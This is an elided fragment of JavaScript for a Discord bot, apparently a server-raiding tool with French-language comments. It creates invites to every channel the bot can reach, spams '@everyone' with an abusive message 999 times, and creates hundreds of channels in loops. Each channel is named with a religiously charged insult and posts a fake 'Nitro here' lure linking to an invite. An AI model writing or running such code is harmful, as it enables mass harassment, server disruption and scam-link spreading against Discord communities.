...
if(message.content.includes("!ke")){
...
if(message.content.includes("!kee")){
  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
          ...
          if(message.content === "!issou"){
            ...
            if(message.content.includes("@everyone")){
                for(var i = 0; i < 999; i++){
                    message.channel.send("@everyone Okue Le Tchoupi islamiste TA BZ VIEN ICI https://discord.gg/uY63Q3C")
                }
            }
            //réaction en chaine
                  if(message.content === "channel"){
                    ...
                    message.channel.send("issou").then(m => m.delete());
                      for(var i = 0; i < 500; i++){
                          ...
                          message.guild.createChannel("Okue Le Tchoupi islamiste","text").then(c => c.send("@everyone Nitro here https://discord.gg/uY63Q3C."))
                          message.guild.createChannel("Okue Le Tchoupi islamiste","text").then(c => c.send("@everyone Nitro here https://discord.gg/uY63Q3C."))
                          message.guild.createChannel("Okue Le Tchoupi islamiste", "text").then(c => c.send("@everyone Nitro here https://discord.gg/uY63Q3C."))
                          message.guild.createChannel("Okue Le Tchoupi islamiste","text").then(c => c.send("@everyone Nitro here https://discord.gg/uY63Q3C."))
                          message.guild.createChannel("Okue Le Tchoupi islamiste","text").then(c => c.send("@everyone Nitro here https://discord.gg/uY63Q3C."))
...
let cont = message.content.slice(1).split(" ")
 ...
 LE Centre 🌙 https://discord.gg/uY63Q3C`);
});
    }
})
